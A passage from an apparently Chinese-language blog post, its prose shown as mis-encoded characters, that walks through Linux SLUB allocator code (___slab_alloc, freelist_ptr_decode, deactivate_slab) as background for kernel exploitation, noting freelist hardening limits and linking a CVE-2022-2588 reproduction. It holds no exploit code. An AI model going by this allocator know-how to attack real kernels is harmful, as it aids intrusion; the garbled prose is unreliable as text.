class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *___slab_alloc(struct kmem_cache *s, <span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node,</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, struct kmem_cache_cpu *c, <span class="keyword">unsigned</span> <span class="keyword">int</span> orig_size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">void</span> *freelist;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">partial_context</span> <span class="title">pc</span>;</span></span><br><span class="line"></span><br><span class="line">stat(s, ALLOC_SLOWPATH);</span><br><span class="line"></span><br><span class="line">reread_slab:</span><br><span class="line"></span><br><span class="line">slab = READ_ONCE(c-&gt;slab);</span><br><span class="line"><span class="keyword">if</span> (!slab) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * if the node is not online or has no normal memory, just</span></span><br><span class="line"><span class="comment"> * ignore the node constraint</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(node != NUMA_NO_NODE &amp;&amp;</span><br><span class="line">     !node_isset(node, slab_nodes)))</span><br><span class="line">node = NUMA_NO_NODE;</span><br><span class="line"><span class="keyword">goto</span> new_slab;</span><br><span class="line">&#125;</span><br><span class="line">redo:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!node_match(slab, node))) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * same as above but node_match() being false already</span></span><br><span class="line"><span class="comment"> * implies node != NUMA_NO_NODE</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!node_isset(node, slab_nodes)) &#123;</span><br><span class="line">node = NUMA_NO_NODE;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">stat(s, ALLOC_NODE_MISMATCH);</span><br><span class="line"><span class="keyword">goto</span> deactivate_slab;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * By rights, we should be searching for a slab page that was</span></span><br><span class="line"><span class="comment"> * PFMEMALLOC but right now, we are losing the pfmemalloc</span></span><br><span class="line"><span class="comment"> * information when the page leaves the per-cpu allocator</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags)))</span><br><span class="line"><span class="keyword">goto</span> deactivate_slab;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* must check again c-&gt;slab in case we got preempted and it changed */</span></span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">goto</span> reread_slab;</span><br><span class="line">&#125;</span><br><span class="line">freelist = c-&gt;freelist;</span><br><span class="line"><span class="keyword">if</span> (freelist)</span><br><span class="line"><span class="keyword">goto</span> load_freelist;</span><br><span class="line"></span><br><span class="line">freelist = get_freelist(s, slab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!freelist) &#123;</span><br><span class="line">c-&gt;slab = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line">stat(s, DEACTIVATE_BYPASS);</span><br><span class="line"><span class="keyword">goto</span> new_slab;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stat(s, ALLOC_REFILL);</span><br><span class="line"></span><br><span class="line">load_freelist:</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * freelist is pointing to the list of objects to be used.</span></span><br><span class="line"><span class="comment"> * slab is pointing to the slab from which the objects are obtained.</span></span><br><span class="line"><span class="comment"> * That slab must be frozen for per cpu allocations to work.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">VM_BUG_ON(!c-&gt;slab-&gt;frozen);</span><br><span class="line">c-&gt;freelist = get_freepointer(s, freelist);</span><br><span class="line">c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line"></span><br><span class="line">deactivate_slab:</span><br><span class="line"></span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (slab != c-&gt;slab) &#123;</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">goto</span> reread_slab;</span><br><span class="line">&#125;</span><br><span class="line">freelist = c-&gt;freelist;</span><br><span class="line">c-&gt;slab = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;freelist = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line">deactivate_slab(s, slab, freelist);</span><br><span class="line"></span><br><span class="line">new_slab:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slub_percpu_partial(c)) &#123;</span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(c-&gt;slab)) &#123;</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">goto</span> reread_slab;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slub_percpu_partial(c))) &#123;</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="comment">/* we were preempted and partial list got empty */</span></span><br><span class="line"><span class="keyword">goto</span> new_objects;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">slab = c-&gt;slab = slub_percpu_partial(c);</span><br><span class="line">slub_set_percpu_partial(c, slab);</span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line">stat(s, CPU_PARTIAL_ALLOC);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_objects:</span><br><span class="line"></span><br><span class="line">pc.flags = gfpflags;</span><br><span class="line">pc.slab = &amp;slab;</span><br><span class="line">pc.orig_size = orig_size;</span><br><span class="line">freelist = get_partial(s, node, &amp;pc);</span><br><span class="line"><span class="keyword">if</span> (freelist)</span><br><span class="line"><span class="keyword">goto</span> check_new_slab;</span><br><span class="line"></span><br><span class="line">slub_put_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">slab = new_slab(s, gfpflags, node);</span><br><span class="line">c = slub_get_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab)) &#123;</span><br><span class="line">slab_out_of_memory(s, gfpflags, node);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stat(s, ALLOC_SLAB);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmem_cache_debug(s)) &#123;</span><br><span class="line">freelist = alloc_single_from_new_slab(s, slab, orig_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!freelist))</span><br><span class="line"><span class="keyword">goto</span> new_objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)</span><br><span class="line">set_track(s, freelist, TRACK_ALLOC, addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * No other reference to the slab yet so we can</span></span><br><span class="line"><span class="comment"> * muck around with it freely without cmpxchg</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">freelist = slab-&gt;freelist;</span><br><span class="line">slab-&gt;freelist = <span class="literal">NULL</span>;</span><br><span class="line">slab-&gt;inuse = slab-&gt;objects;</span><br><span class="line">slab-&gt;frozen = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">inc_slabs_node(s, slab_nid(slab), slab-&gt;objects);</span><br><span class="line"></span><br><span class="line">check_new_slab:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmem_cache_debug(s)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For debug caches here we had to go through</span></span><br><span class="line"><span class="comment"> * alloc_single_from_partial() so just store the tracking info</span></span><br><span class="line"><span class="comment"> * and return the object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)</span><br><span class="line">set_track(s, freelist, TRACK_ALLOC, addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags))) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For !pfmemalloc_match() case we don&#x27;t load freelist so that</span></span><br><span class="line"><span class="comment"> * we don&#x27;t make further mismatched allocations easier.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">deactivate_slab(s, slab, get_freepointer(s, freelist));</span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">retry_load_slab:</span><br><span class="line"></span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(c-&gt;slab)) &#123;</span><br><span class="line"><span class="keyword">void</span> *flush_freelist = c-&gt;freelist;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">flush_slab</span> =</span> c-&gt;slab;</span><br><span class="line"></span><br><span class="line">c-&gt;slab = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;freelist = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line"></span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line">deactivate_slab(s, flush_slab, flush_freelist);</span><br><span class="line"></span><br><span class="line">stat(s, CPUSLAB_FLUSH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> retry_load_slab;</span><br><span class="line">&#125;</span><br><span class="line">c-&gt;slab = slab;</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> load_freelist;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œ<code>___slab_alloc</code>å‡½æ•°æ‰æ˜¯å…¶æ ¸å¿ƒå‡½æ•°ï¼Œé¦–å…ˆæ˜¯<code>reread_slab</code>æ ‡ç­¾ä¸­ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨<code>slab</code>å¦‚æœä¸å­˜åœ¨åˆ™è·³è½¬åˆ°<code>new_slab</code>ã€‚</p><p>åœ¨<code>new_slab</code>ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨<code>percpu partial slab</code>ï¼Œå¦‚æœå­˜åœ¨åˆ™å°†åˆ™å°†é“¾è¡¨ä¸­å–å‡ºä¸€ä¸ª<code>slab</code>ç»™åˆ°<code>percpu slab</code>éšåè·³è¿›<code>redo</code>ã€‚</p><p>åœ¨<code>redo</code>æ ‡ç­¾ä¸­ï¼Œé¦–å…ˆåˆ¤æ–­slabæ˜¯å¦å’Œ<code>node</code>ä»¥åŠåˆ†é…æ ‡è¯†ä½åŒ¹é…ï¼Œå¦‚æœä¸åŒ¹é…åˆ™è·³è½¬è‡³<code>deactivate_slab</code>æ ‡ç­¾ï¼Œç´§æ¥ç€éªŒè¯å½“å‰çš„slabæ˜¯å¦æ˜¯åŸæ¥cpuçš„slabï¼Œå¦‚æœä¸æ˜¯åˆ™è¡¨ç¤ºå‘ç”Ÿäº†æŠ¢å è·³è½¬åˆ°<code>reread_slab</code>æ ‡ç­¾ä¸­ã€‚éšåè·å–<code>freelist</code>è‹¥<code>freelist</code>ä¸ä¸ºç©ºåˆ™è·³è½¬åˆ°<code>load_freelist</code>ä¸­ï¼Œè‹¥ä¸ºç©ºåˆ™è°ƒç”¨<code>get_freelist</code>å‡½æ•°è·å–slabçš„<code>freelist</code>å¦‚æœä»ç„¶ä¸ºç©ºï¼Œåˆ™å°†<code>percpu slab</code>çš„<code>freelist</code>è®¾ç½®ä¸ºNULLéšåè·³è½¬åˆ°ä¸‹ä¸€ä¸ªtidï¼Œå¹¶é‡æ–°è¿›å…¥<code>new_slab</code>æ ‡ç­¾è·å–<code>slab</code>ã€‚</p><p>éšåçœ‹<code>load_freelist</code>æ ‡ç­¾ï¼Œè¿™ä¸€æ®µå°±æ¯”è¾ƒç®€å•ç†è§£äº†ï¼Œå°±æ˜¯å°†<code>freelist</code>çš„<code>next</code>æŒ‡é’ˆèµ‹å€¼ç»™<code>percpu freelist</code>ï¼Œç„¶åè·å¾—ä¸‹ä¸€ä¸ªtidéšåè¿”å›<code>freelist</code>ã€‚å¯ä»¥æ³¨æ„åˆ°çš„æ˜¯è¿™é‡Œä½¿ç”¨çš„æ˜¯<code>get_freepointer</code>å‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°æœ€ç»ˆä¼šè°ƒç”¨åˆ°<code>freelist_ptr_decode</code>å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr_decode</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">freeptr_t</span> ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *decoded;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">decoded = (<span class="keyword">void</span> *)(ptr.v ^ s-&gt;random ^ swab(ptr_addr));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">decoded = (<span class="keyword">void</span> *)ptr.v;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> decoded;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•è§‚å¯Ÿè¿™ä¸ªå‡½æ•°å¯ä»¥å‘ç°å³ä¾¿æ˜¯å¼€å¯äº†<code>Hardened freelist</code>ä¿æŠ¤çš„æƒ…å†µä¸‹<code>slab-&gt;freelist</code>éƒ½æ˜¯æ²¡æœ‰åŠ å¯†çš„ï¼ŒåŠ å¯†çš„åªæ˜¯å¯¹è±¡ä¸Šçš„å†…å®¹ã€‚</p><p>å›åˆ°å‰é¢çš„æµç¨‹è¿›å…¥åˆ°<code>deactivate_slab</code>æ ‡ç­¾ä¸­ï¼Œè¿™é‡Œé€»è¾‘å¾ˆç®€å•ï¼Œå°±æ˜¯å°†<code>percpu</code>çš„<code>freelist</code>å’Œ<code>slab</code>è®¾ç½®ä¸ºNULLå¹¶ä¸”è·å–åˆ°ä¸‹ä¸€ä¸ªtidä¹‹åç›´æ¥è°ƒç”¨<code>deactivate_slab</code>å‡½æ•°ï¼Œå¯¹æ•´å¼ slabè¿›è¡Œ<code>deactivate</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deactivate_slab</span><span class="params">(struct kmem_cache *s, struct slab *slab,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">void</span> *freelist)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">slab_modes</span> &#123;</span> M_NONE, M_PARTIAL, M_FREE, M_FULL_NOLIST &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> get_node(s, slab_nid(slab));</span><br><span class="line"><span class="keyword">int</span> free_delta = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">slab_modes</span> <span class="title">mode</span> =</span> M_NONE;</span><br><span class="line"><span class="keyword">void</span> *nextfree, *freelist_iter, *freelist_tail;</span><br><span class="line"><span class="keyword">int</span> tail = DEACTIVATE_TO_HEAD;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> <span class="title">new</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> <span class="title">old</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slab-&gt;freelist) &#123;</span><br><span class="line">stat(s, DEACTIVATE_REMOTE_FREES);</span><br><span class="line">tail = DEACTIVATE_TO_TAIL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Stage one: Count the objects on cpu&#x27;s freelist as free_delta and</span></span><br><span class="line"><span class="comment"> * remember the last object in freelist_tail for later splicing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">freelist_tail = <span class="literal">NULL</span>;</span><br><span class="line">freelist_iter = freelist;</span><br><span class="line"><span class="keyword">while</span> (freelist_iter) &#123;</span><br><span class="line">nextfree = get_freepointer(s, freelist_iter);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If &#x27;nextfree&#x27; is invalid, it is possible that the object at</span></span><br><span class="line"><span class="comment"> * &#x27;freelist_iter&#x27; is already corrupted.  So isolate all objects</span></span><br><span class="line"><span class="comment"> * starting at &#x27;freelist_iter&#x27; by skipping them.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (freelist_corrupted(s, slab, &amp;freelist_iter, nextfree))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">freelist_tail = freelist_iter;</span><br><span class="line">free_delta++;</span><br><span class="line"></span><br><span class="line">freelist_iter = nextfree;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Stage two: Unfreeze the slab while splicing the per-cpu</span></span><br><span class="line"><span class="comment"> * freelist to the head of slab&#x27;s freelist.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Ensure that the slab is unfrozen while the list presence</span></span><br><span class="line"><span class="comment"> * reflects the actual number of objects during unfreeze.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We first perform cmpxchg holding lock and insert to list</span></span><br><span class="line"><span class="comment"> * when it succeed. If there is mismatch then the slab is not</span></span><br><span class="line"><span class="comment"> * unfrozen and number of objects in the slab may have changed.</span></span><br><span class="line"><span class="comment"> * Then release lock and retry cmpxchg again.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">redo:</span><br><span class="line"></span><br><span class="line">old.freelist = READ_ONCE(slab-&gt;freelist);</span><br><span class="line">old.counters = READ_ONCE(slab-&gt;counters);</span><br><span class="line">VM_BUG_ON(!old.frozen);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Determine target state of the slab */</span></span><br><span class="line"><span class="keyword">new</span>.counters = old.counters;</span><br><span class="line"><span class="keyword">if</span> (freelist_tail) &#123;</span><br><span class="line"><span class="keyword">new</span>.inuse -= free_delta;</span><br><span class="line">set_freepointer(s, freelist_tail, old.freelist);</span><br><span class="line"><span class="keyword">new</span>.freelist = freelist;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="keyword">new</span>.freelist = old.freelist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span>.frozen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial) &#123;</span><br><span class="line">mode = M_FREE;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">new</span>.freelist) &#123;</span><br><span class="line">mode = M_PARTIAL;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Taking the spinlock removes the possibility that</span></span><br><span class="line"><span class="comment"> * acquire_slab() will see a slab that is frozen</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">spin_lock_irqsave(&amp;n-&gt;list_lock, flags);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">mode = M_FULL_NOLIST;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!slab_update_freelist(s, slab,</span><br><span class="line">old.freelist, old.counters,</span><br><span class="line"><span class="keyword">new</span>.freelist, <span class="keyword">new</span>.counters,</span><br><span class="line"><span class="string">&quot;unfreezing slab&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (mode == M_PARTIAL)</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mode == M_PARTIAL) &#123;</span><br><span class="line">add_partial(n, slab, tail);</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line">stat(s, tail);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode == M_FREE) &#123;</span><br><span class="line">stat(s, DEACTIVATE_EMPTY);</span><br><span class="line">discard_slab(s, slab);</span><br><span class="line">stat(s, FREE_SLAB);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode == M_FULL_NOLIST) &#123;</span><br><span class="line">stat(s, DEACTIVATE_FULL);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç®€å•æä¸€ä¸‹<code>deacticate_slab</code>å‡½æ•°çš„é€»è¾‘ï¼Œéå†<code>freelist</code>æ£€æŸ¥æ˜¯å¦è¢«ç ´åï¼Œæ”¾å¼ƒè¢«ç ´åçš„éƒ¨åˆ†ï¼Œå°†<code>slab-&gt;freelist</code>è®¾ä¸ºåŸ<code>kmem_cache_cpu-&gt;freelist</code>ï¼Œè‹¥slabä¸ŠåŸæœ‰freelistä¸ä¸º NULL åˆ™å†æ¥åˆ°åé¢ï¼Œè®¾ç½® slab çš„ countersï¼Œå…¶ä¸­å°† <code>frozen</code> è®¾ä¸º 0ï¼Œè‹¥ slab ä¸Šçš„å¯¹è±¡å…¨éƒ¨ç©ºé—²ä¸” node çš„ partial slab æ•°é‡å¤§äº <code>kmem_cache-&gt;min_partial</code>ï¼Œè°ƒç”¨ <code>discard_slab()</code> å°† slab é‡Šæ”¾ï¼Œè‹¥ slab ä¸Šå­˜åœ¨ç©ºé—²å¯¹è±¡ï¼Œè°ƒç”¨ <code>add_partial()</code> å°†å…¶åŠ å…¥ node çš„ partial é“¾è¡¨ã€‚è¿™é‡Œçš„æ“ä½œåœ¨ <a class="link"   href="https://cv196082.gitee.io/2023/10/27/CVE-2022-2588/" >CVE-2022-2588å¤ç°<i class="fas fa-external-link-alt"></i></a> é‡Œé¢çš„<code>CVE-2023-3269</code>ä¸­ä½¿ç”¨è¿‡ã€‚</p><p>æ¥ä¸‹æ¥è¿›å…¥<code>new_object</code>æ ‡ç­¾å†…ï¼Œè‹¥æ˜¯<code>percpu partial</code>é“¾è¡¨ä¹Ÿä¸ºç©ºï¼Œä¾¿ä¼šè¿›å…¥åˆ°è¿™ä¸ªæ 